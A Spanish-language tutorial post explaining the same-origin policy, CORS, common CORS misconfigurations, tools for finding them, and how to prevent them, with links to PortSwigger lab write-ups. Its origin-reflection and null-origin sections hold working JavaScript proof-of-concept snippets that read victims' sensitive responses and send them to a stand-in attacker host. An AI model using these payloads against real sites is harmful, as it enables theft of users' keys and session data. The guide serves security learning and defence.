---
title: "CORS guide"
description: "Guía sobre CORS"
date: 2025-08-27 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Guides
tags:
  - Portswigger Guides
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

`Explicación técnica de la vulnerabilidad de CORS`. Detallamos cómo `identificar` y `explotar` esta vulnerabilidad, tanto `manualmente` como con `herramientas automatizadas`. Además, exploramos `estrategias clave para prevenirla`

---

## ¿Qué es el cross-origin resource sharing (CORS)?

El `Cross-Origin Resource Sharing (CORS)` es un `mecanismo` del `navegador` que permite el `acceso controlado` a `recursos` ubicados fuera de un `dominio` determinado. Amplía y flexibiliza la `SOP`. Sin embargo, también puede generar `ataques cross-domain` si la `política de CORS` de un `sitio web` está `mal configurada` o `mal implementada`. Debemos tener en cuenta que `CORS` no protegerá contra ataques `cross-origin`, como el `CSRF`

![](/assets/img/CORS-Guide/image_1.png)

## ¿Qúe es la same-origin policy (SOP)?

La `Same-Origin Policy (SOP)` es un `mecanismo de seguridad` del `navegador web` que tiene como objetivo `prevenir ataques entre sitios web`, esto lo hace `impidiendo que un script de una página web acceda a datos de otra página web si no tienen el mismo origen`. Generalmente, permite que un `dominio` emita `solicitudes a otros dominios`, pero no que `acceda a las respuestas`

El `origen` está compuesto por un `esquema URI (http://,https://,ftp://)`, un `dominio (eneba.com)` y un `número de puerto (:80)`. Por ejemplo:

```
http://normal-website.com/example/example.html
```

En el caso de `Internet Explorer` permite el acceso a `http://normal-website.com:8080/example/` porque `no tiene en cuenta el número de puerto` al aplicar la política `SOP`

| URL                                     | ¿Acceso permitido?                       |
| --------------------------------------- | ---------------------------------------- |
| http://normal-website.com/example/      | Sí (mismo esquema URI, dominio y puerto) |
| http://normal-website.com/example2/     | Sí (mismo esquema URI, dominio y puerto) |
| https://normal-website.com/example/     | No (esquema URI y puerto diferentes)     |
| http://en.normal-website.com/example/   | No (dominio diferente)                   |
| http://www.normal-website.com/example/  | No (dominio diferente)                   |
| http://normal-website.com:8080/example/ | No (puerto diferente)                    |

## ¿Por qué es necesaria la same-origin policy (SOP)?

Cuando un `navegador` envía una `solicitud HTTP` desde un `origen` a `otro`, todas las `cookies`, incluyendo las de `sesión` asociadas al `dominio destino` también se `envían` como parte de la `solicitud`. Esto significa que la `respuesta` se generará dentro de la `sesión del usuario` e incluirá cualquier `dato privado` asociado a su `cuenta`. Sin la `SOP`, si visitamos un `sitio malicioso`, este podría `leer` nuestros `correos de Gmail`, `mensajes privados de Facebook`, etc

## ¿Cómo se implementa la same-origin policy (SOP)?

La `SOP` generalmente `controla el acceso` que tiene el `código JavaScript` a `contenido` cargado desde otro `dominio` pero la carga de recursos `cross-origin` está permitida. Por ejemplo, la `SOP` permite `incrustar imágenes` mediante la etiqueta `<img>`, `medios` con la etiqueta `<video>` y `JavaScript` mediante la etiqueta `<script>`, sin embargo, aunque estos `recursos externos` pueden ser `cargados` por la `página`, cualquier `código JavaScript` en la `página` no podrá `leer el contenido` de estos `recursos`

Existen varias `excepciones` a la `SOP`:

- Algunos `objetos` son `modificables` pero no `legibles` entre `dominios`, como el `objeto location` o la propiedad `location.href` en `iframes` o `ventanas nuevas`

- Algunos `objetos` son `legibles` pero no `modificables` entre `dominios`, como la `propiedad closed` y la `propiedad length` del `objeto window` (que almacena el `número de frames` en la `página`)

- La `función replace` generalmente puede ser `llamada` entre `dominios` en el `objeto location`

- Se pueden `llamar` a ciertas `funciones` entre `dominios`. Por ejemplo, podemos `invocar` las funciones `close`, `blur` y `focus` en una `ventana nueva`. La `función postMessage` también puede ser `usada` en `iframes` y `ventanas nuevas` para `enviar mensajes` de un `dominio` a otro

Debido a `requisitos legacy`, la `SOP` es más `permisiva` con las `cookies`, por lo que suelen ser `accesibles` desde todos los `subdominios` de un `sitio web`, aunque cada `subdominio` sea técnicamente un `origen diferente`. Podemos `mitigar parcialmente` este `riesgo` usando el `atributo HttpOnly` en las `cookies`

Es posible relajar la `SOP` usando `document.domain`, esta propiedad especial permite `flexibilizar` la `SOP` para un `dominio específico`, pero solo si forma parte de tu `Fully Qualified Domain Name (FQDN)`. Por ejemplo, podrías tener el dominio `marketing.ejemplo.com` y querer `leer` su `contenido` desde `ejemplo.com`, para hacerlo, ambos dominios deben configurar `document.domain` como `ejemplo.com`. Así, la `SOP` permitirá `el acceso entre los dos dominios pese a tener orígenes diferentes`

En el `pasado`, era posible asignar `document.domain` a un `Top-Level Domain (TLD)` (como `.com`), lo que permitía `acceso` entre cualquier `dominio` bajo el mismo `Top-Level Domain (TLD)`, pero los `navegadores modernos` ya lo `impiden`

## ¿Qué es la cabecera de respuesta Access-Control-Allow-Origin?

La cabecera `Access-Control-Allow-Origin` se incluye en la `respuesta` de un `sitio web` a una `solicitud` proveniente de otro `sitio web`, e indica qué `origen` tiene permiso para `acceder` al `recurso solicitado`

El `navegador` compara el valor de `Access-Control-Allow-Origin` con el `origen` del `sitio web` que realizó la `petición`. Si `coinciden`, permite el `acceso` a la `respuesta`, de lo contrario, lo `bloquea` por `restricciones de seguridad`

## ¿Cómo implementar un intercambio de recursos cross-origin simple?

La especificación `CORS` establece las `cabeceras HTTP` que se `intercambian` entre `servidores web` y `navegadores` para `controlar` las solicitudes de `recursos` provenientes de `dominios distintos` al `origen`. Entre las `cabeceras` definidas por `CORS`, `Access-Control-Allow-Origin` es la más `importante`

Esta `cabecera` es `enviada` por el `servidor` como `respuesta` cuando recibe una `solicitud entre dominios`, la cual `incluye automáticamente` la `cabecera Origin` agregada por el `navegador`

Por ejemplo, supongamos que un `sitio web` cuyo origen es `normal-website.com` realiza la siguiente `solicitud entre dominios`:

```
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
```

El servidor en `robust-website.com` responde así:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```

El `navegador` permitirá que el `código` ejecutado en `normal-website.com` acceda a la `respuesta` porque los `orígenes` coinciden. La especificación `Access-Control-Allow-Origin` permite `múltiples orígenes`, el valor `null` o la `wildcard *`. Sin embargo, ningún `navegador` admite `múltiples orígenes` y existen `restricciones` en el uso de las `wildcards *`

## Manejar de solicitudes de recursos cross-origin con credenciales

El `comportamiento predeterminado` de las `solicitudes de recursos cross-origin` es que se `envíen sin credenciales` (como `cookies` o `cabeceras de Autorización`). No obstante, el `servidor remoto` puede `autorizar` el `acceso` a la `respuesta` cuando se `incluyen credenciales` configurando la cabecera `Access-Control-Allow-Credentials: true`

Si el `sitio solicitante` utiliza `JavaScript`, puede indicar que `envía cookies` con la `petición`

```
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```

La `respuesta` a esta `solicitud` es la siguiente:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

En este caso, el `navegador` permitirá que el `sitio web solicitante` lea la `respuesta`, siempre que la `cabecera Access-Control-Allow-Credentials` esté configurada como `true`. De lo contrario, el navegador `bloqueará` el `acceso` a la `respuesta`

## Relajación de las especificaciones de CORS con wildcards

La cabecera `Access-Control-Allow-Origin` soporta `wildcards`

```
Access-Control-Allow-Origin: *
```

Debemos tener en cuenta que las `wildcards` no se pueden usar `dentro` de `otro valor`, por ejemplo, esta `cabecera` no sería válida:

```
Access-Control-Allow-Origin: https://*.normal-website.com
```

Afortunadamente, desde el `punto de vista` de la `seguridad`, el uso de `wildcards` está `restringido`, es decir, no se puede usar una `wilcard` junto con una `transferencia de credenciales (autenticación, cookies o certificados del lado del cliente) cross-origin` ya que esto sería `peligrosamente inseguro`, exponiendo cualquier `contenido autenticado` en el `sitio objetivo` a todos. Un ejemplo de esto, sería lo siguiente:

```
Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true
```

Dadas estas `restricciones`, algunos `servidores web` crean dinámicamente las cabeceras `Access-Control-Allow-Origin` basándose en el `origen especificado` por el `cliente`. En consecuencia, la `respuesta` a una `solicitud entre dominios` luce de esta forma

## Pre-flight checks

El `pre-flight check (verificación previa)` se añadió a `CORS` para proteger a los `recursos legacy` de las `opciones de solicitud ampliadas` permitidas por `CORS`. En ciertas circunstancias, cuando una `solicitud cross-domain` incluye un `método HTTP no estándar` o `cabeceras personalizadas`, la solicitud `cross-origin` va precedida de una `petición` que utiliza el método `OPTIONS` y el protocolo `CORS` exige esta `verificación inicial` para determinar qué `métodos` y `cabeceras` están permitidos antes de `autorizar la solicitud cross-domain`. A esto se le denomina `pre-flight check`

El `servidor` responde con el `origen autorizado` y una lista de `métodos permitidos` y el `navegador` verifica si el `método` utilizado por el `sitio web solicitante` está `incluido` en dicha `lista`

Por ejemplo, esta es una `solicitud pre-flight` que busca utilizar el `método PUT` junto con una `cabecera personalizada` llamada `Special-Request-Header`:

```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

El `servidor` podría `devolver` una `respuesta` como la siguiente:

```
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

Esta respuesta establece los `métodos permitidos (PUT, POST y OPTIONS)` y las `cabeceras de solicitud permitidos (Special-Request-Header)`. En este caso particular, el `servidor cross-domain`, es decir, el `servidor` que `acepta solicitudes` provenientes de `dominios diferentes al suyo`, también `permite` el `envío` de `credenciales` y la cabecera `Access-Control-Max-Age` define un `tiempo máximo` para `almacenar` en `caché` la respuesta `pre-flight` para `reutilizarla`

Si los `métodos` y las `cabeceras de solicitud` están permitidos (como en este ejemplo), el `navegador` procesa la solicitud `cross-origin` de la manera habitual. Las `verificaciones pre-flight` agregan un `round-trip (RTT)` adicional de solicitud `HTTP` a la petición `cross-domain`, lo que aumenta la `sobrecarga (overhead)` de navegación

## ¿Protege CORS contra ataques CSRF?

`CORS` no proporciona protección contra ataques de `CSRF`. Como `CORS` es una `relajación controlada` de la `SOP`, una `configuración deficiente de CORS` puede `aumentar la posibilidad de ataques CSRF` o `agravar su impacto`. Existen varias formas de realizar `ataques CSRF` sin usar `CORS`, por ejemplo, incluyendo `formularios HTML` o incluyendo `recursos cross-domain`

## Vulnerabilidades derivadas errores de configuración de CORS

Muchos `sitios web modernos` utilizan `CORS` para permitir el acceso desde `subdominios` y `sitios web de terceros`. Sin embargo, su `implementación de CORS` puede contener `errores` o ser `demasiado permisiva`, lo que puede resultar en `vulnerabilidades explotables`

### Cabecera ACAO generada por el servidor a partir de la cabecera Origin especificada por el cliente

Algunas `aplicaciones` necesitan proporcionar `acceso` a `múltiples dominios`. Mantener una `lista de dominios permitidos` requiere `esfuerzo continuo`, y cualquier `error` podría `interrumpir la funcionalidad`. Por ello, `algunas aplicaciones permiten acceso desde cualquier dominio`

Un método para implementar esto consiste en `leer la cabecera Origin` de las solicitudes e `incluir en la respuesta una cabecera` que indique que el `origen solicitante está permitido`. Por ejemplo, consideremos una `aplicación` que `recibe` la siguiente `solicitud`:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

Y posteriormente, `responde` así:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Estas `cabeceras` indican que se permite el `acceso desde el dominio solicitante (malicious-website.com)` y que las solicitudes `cross-origin` pueden incluir `cookies (Access-Control-Allow-Credentials: true)`, por lo que se procesarán dentro de la `sesión del usuario`

Dado que la `aplicación refleja orígenes arbitrarios` en la cabecera `Access-Control-Allow-Origin`, esto significa que absolutamente `cualquier dominio` puede `acceder` a los `recursos` del `dominio vulnerable`. Si la respuesta contiene `información sensible` como una `clave API` o un `token CSRF`, podríamos obtener estos datos utilizando el siguiente `script` en nuestro `sitio web`:

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '//malicious-website.com/log?key=' + this.responseText;
};
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- CORS vulnerability with basic origin reflection - [https://justice-reaper.github.io/posts/CORS-Lab-1/](https://justice-reaper.github.io/posts/CORS-Lab-1/)

### Errores al parsear las cabeceras Origin

Algunas aplicaciones que admiten el `acceso desde múltiples orígenes` lo hacen utilizando una `whitelist de orígenes permitidos`. Cuando se recibe una `solicitud CORS`, el `origen proporcionado` se compara con la `whitelist` y si el `origen` aparece en la `whitelist`, se `refleja en la cabecera Access-Control-Allow-Origin` para que se `conceda` el `acceso`. Por ejemplo, la aplicación recibe una `solicitud` como esta:

```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

La aplicación `verifica el origen proporcionado` comparándolo con su `lista de orígenes permitidos` y, si el origen está en la lista, lo `refleja` de la siguiente manera:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

Los errores suelen surgir al implementar `whitelist de orígenes para CORS`. Algunas organizaciones deciden `permitir el acceso desde todos sus subdominios` (incluidos `subdominios futuros que aún no existen`) y algunas aplicaciones permiten el `acceso desde varios dominios de otras organizaciones`, incluyendo sus `subdominios`

Estas reglas a menudo se implementan `comparando prefijos o sufijos de URL` o usando `expresiones regulares`. Si hay algún `error` en la `implementación`, se puede `permitir` el `acceso a dominios externos no deseados`, a este tipo error se le llama `error parseando las cabeceras origin`

Por ejemplo, supongamos que una aplicación `concede acceso` a todos los `dominios que terminan en`:

```
normal-website.com
```

Un `atacante` podría `obtener acceso` si `registra` el siguiente `dominio`:

```
hackersnormal-website.com
```

Alternativamente, supongamos que `una aplicación concede acceso a todos los dominios que comienzan con`:

```
normal-website.com
```

Un atacante podría `obtener acceso` usando el siguiente `dominio`:

```
normal-website.com.evil-user.net
```

### El valor null para la cabecera origin está whitelisteado

La `especificación para la cabecera Origin` admite el valor `null`. Los navegadores pueden enviar el valor `null` en la cabecera `Origin` en varias situaciones

- `Redirecciones cross-origin`
    
- `Solicitudes desde datos serializados`
    
- `Solicitudes que usan el protocolo file:`
    
- `Solicitudes cross-origin en entornos restringidos (sandboxed)`

Algunas aplicaciones pueden incluir `null` en la `whitelist` para facilitar el `desarrollo local` de la aplicación. Por ejemplo, supongamos que una aplicación `recibe` la siguiente `solicitud cross-origin`:

```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

El servidor `responde` con lo siguiente:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

En esta situación, un `atacante` puede usar varios trucos para generar una `solicitud cross-origin` que contenga el valor `null` en la cabecera `Origin`. Esto satisfará a la `whitelist` permitiendo un `acceso cross-domain`. Por ejemplo, se puede hacer usando una `solicitud cross-origin` en un `iframe sandboxed` de la siguiente forma:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
  <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'vulnerable-website.com/sensitive-victim-data', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
      location = 'malicious-website.com/log?key=' + this.responseText;
    };
  </script>
"></iframe>
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- CORS vulnerability with trusted null origin - [https://justice-reaper.github.io/posts/CORS-Lab-2/](https://justice-reaper.github.io/posts/CORS-Lab-2/)

### Explotar un XSS a través de relaciones de confianza de CORS

Incluso una configuración `"correcta"` de `CORS` establece una `relación de confianza entre dos orígenes`. Si un `sitio web confía en un origen` que es `vulnerable a cross-site scripting (XSS)`, un `atacante` podría `explotar la vulnerabilidad XSS` para `inyectar código JavaScript` que utilice `CORS` para `recuperar información sensible` del `sitio web que confía en la aplicación vulnerable`. Por ejemplo, si se `envía` la siguiente `petición`:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Y el servidor `responde` así:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Si un `atacante` que encuentra una `vulnerabilidad XSS` en `subdomain.vulnerable-website.com` podría usarla para `recuperar la clave API`, utilizando una `URL` como la siguiente:

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

### Comprometiendo TLS debido a una configuración deficiente de CORS

Supongamos que un `aplicación` que utiliza estrictamente `HTTPS` también incluye en su `whitelist` un `subdominio de confianza` que está usando `HTTP`. Por ejemplo, cuando la aplicación `recibe` la siguiente solicitud:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Y `responde` con estas `cabeceras`:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Si un `atacante` puede `interceptar el tráfico` de un `usuario víctima` podría `explotar la configuración CORS` para `comprometer la interacción` de la `víctima` con la `web`. Este ataque implica los siguientes pasos:

1. El `usuario víctima` realiza una `solicitud HTTP`

2. El `atacante` inyecta una `redirección` hacia `http://trusted-subdomain.vulnerable-website.com`

3. El `navegador de la víctima` sigue la `redirección`

4. El `atacante intercepta la solicitud HTTP sin cifrar` y devuelve una `respuesta falsificada` que contiene una `petición CORS` hacia `https://vulnerable-website.com`

5. El `navegador de la víctima` realiza la `petición CORS`, incluyendo el origen `http://trusted-subdomain.vulnerable-website.com`

6. La `aplicación permite la solicitud` porque ese `origen` está en la `whitelist` y los `datos sensibles solicitados` son `devueltos` en la `respuesta`

7. La `página web falsificada del atacante` puede `leer los datos sensibles` y `transmitirlos a cualquier dominio` bajo el `control del atacante`

Este `ataque` es `efectivo` incluso si `el sitio web vulnerable implementa HTTPS de forma segura`, es decir, `sin endpoints HTTP` y con el `atributo secure seteado en todas las cookies`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- CORS vulnerability with trusted insecure protocols - [https://justice-reaper.github.io/posts/CORS-Lab-3/](https://justice-reaper.github.io/posts/CORS-Lab-3/)

### Intranets y CORS sin credenciales

La mayoría de los `ataques CORS` dependen de la presencia esta cabecera de respuesta:

```
Access-Control-Allow-Credentials: true
```

Sin esa cabecera, el `navegador de la víctima` no enviará sus `cookies`, lo que significa que el atacante solo obtendrá acceso a contenido `no autenticado`, al cual podría acceder directamente navegando al `sitio web objetivo`

Sin embargo, hay una situación común en la que un `atacante` no puede acceder a un `sitio web` directamente, por ejemplo, cuando formamos parte de la `intranet de una organización` y está ubicada dentro de un `espacio de direcciones IP privadas`. Los `sitios webs internos` suelen tener un `estándar de seguridad más bajo` que los `sitios webs externos`, lo que permite a los atacantes encontrar `vulnerabilidades` y obtener un acceso mayor

Por ejemplo, una `solicitud cross-origin` dentro de una red privada puede ser la siguiente:

```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

Y el `servidor` responde con:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

El `servidor de la aplicación` está confiando en `solicitudes a recursos` desde `cualquier origen` sin `credenciales`. Si los `usuarios dentro del espacio de IP privadas` acceden a `internet`, entonces se puede realizar un `ataque CORS` desde un `sitio externo` que utilice el `navegador de la víctima` como `proxy` para acceder a los `recursos de la intranet`

## ¿Cómo detectar y explotar una mala configuración de CORS?

1. `Añadir` el `dominio` y sus `subdominios` al `scope`

2. Primeramente usaremos la extensión `CORS* - Additional CORS Checks` de `Burpsuite`

3. Para verificar los `dominios de confianza` usaremos la extensión `Trusted Domain CORS Scanner` de `Burpsuite`

4. Si preferimos usar herramientas por consola podemos usar `CORScanner`, `CorsOne` o `CorsMe`. La que más gustan son `CORScanner` y `CorsOne`, ya que `CorsMe` tienen el problema de que para detectar si el `Origin` acepta como valor `null`, solo prueban con el valor `Null` y no con `NULL` o `null`, y esto puede provocar que `no detecten la vulnerabilidad en ciertas ocasiones`

5. Si tenemos dudas de cómo explotar el ataque, `Corsy` nos da pistas sobre ello

6. Si en este punto `no podemos explotar CORS`, tenemos que buscar un `dominio de confianza` que sea `vulnerable` a `XSS`. Para ello, debemos revisar la `guía de XSS` para saber como `identificarlos`

7. Si no encontramos nada, procedemos a buscar de `forma manual` siguiendo los pasos de `PayloadsAllTheThings` y `Hacktricks`

8. Para crear un `PoC` usaremos `C0rsPwn3r` o lo haremos de forma `manual`

9. En el caso de estar en una `intranet` usaremos `of-CORS` para la `explotación`

## Cheatsheets para CORS

En `Hacktricks` tenemos una `metodología` para `encontrar errores de configuración en CORS` y `explotarlos`. En `PayloadsAllTheThings` tenemos `payloads` que podemos `usar`. En `Portswigger` tenemos diferentes `payloads`, los cuales podemos usar para `bypassear` ciertos `filtros` que las `webs` apliquen al `valor` de la `cabecera Origin`

- Hacktricks [https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html](https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html)

- Portswigger [https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

- PayloadsAllTheThings [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

## Herramientas

Tenemos estas `herramientas` para `facilitar` la `detección` y `explotación` de `CORS`:

- CorsOne [https://github.com/omranisecurity/CorsOne.git](https://github.com/omranisecurity/CorsOne.git)

- CORScanner [https://github.com/chenjj/CORScanner.git](https://github.com/chenjj/CORScanner.git)

- CorsMe [https://github.com/Shivangx01b/CorsMe.git](https://github.com/Shivangx01b/CorsMe.git)

- Corsy [https://github.com/s0md3v/Corsy.git](https://github.com/s0md3v/Corsy.git)

- CORS* - Additional CORS Checks [https://github.com/PortSwigger/additional-cors-checks.git](https://github.com/PortSwigger/additional-cors-checks.git)

- Trusted Domain CORS Scanner [https://github.com/PortSwigger/trusted-domain-cors-scanner.git](https://github.com/PortSwigger/trusted-domain-cors-scanner.git)

- C0rsPwn3r [https://github.com/YaiYai8/C0rsPwn3r.git](https://github.com/YaiYai8/C0rsPwn3r.git)

- of-CORS [https://github.com/trufflesecurity/of-CORS.git](https://github.com/trufflesecurity/of-CORS.git)

## Prevenir ataques CORS-based

Las `vulnerabilidades CORS` surgen principalmente por `errores de configuración`. Por lo tanto, la `prevención` es un `problema de configuración`. Las siguientes secciones describen algunas `defensas efectivas contra ataques CORS`

### Configuración adecuada de solicitudes cross-origin  

Si un `recurso web` contiene `información sensible`, el `origen` debe estar especificado correctamente en la cabecera `Access-Control-Allow-Origin`

### Permitir solo sitios web de confianza

Puede parecer obvio, pero los `orígenes` especificados en la cabecera `Access-Control-Allow-Origin` deben ser únicamente `sitios web de confianza`. En particular, `reflejar dinámicamente orígenes` de solicitudes `cross-origin` sin validación es fácilmente explotable y debe `evitarse`

### Evitar incluir null en la whitelist de orígenes permitidos

Se debe evitar usar la cabecera `Access-Control-Allow-Origin: null`, ya que, las llamadas `cross-origin` desde `documentos internos` y `solicitudes en entornos aislados (sandbox)` pueden especificar el `origen null`. Las `cabeceras CORS` deben definirse correctamente con respecto a los `orígenes que son de confianza`, tanto en `servidores privados` como en `públicos`

### Evitar usar wildcards en redes internas

No debemos usar `wildcards` en `redes internas`, ni confiar únicamente en la `configuración de la red` para proteger `recursos internos`, ya que `los navegadores dentro de la red interna pueden acceder a dominios externos no confiables`

### CORS no es un sustituto de las políticas de seguridad del lado del servidor

`CORS` define `comportamientos del navegador` y nunca sustituye la `protección del lado del servidor` para `datos sensibles`. Un `atacante` puede falsificar directamente una `solicitud` desde cualquier `origen de confianza`, por lo tanto, los `servidores web` deben seguir aplicando `protecciones sobre datos sensibles`, como `autenticación`, `gestión de sesiones` y además, implementar una `configuración adecuada de CORS`
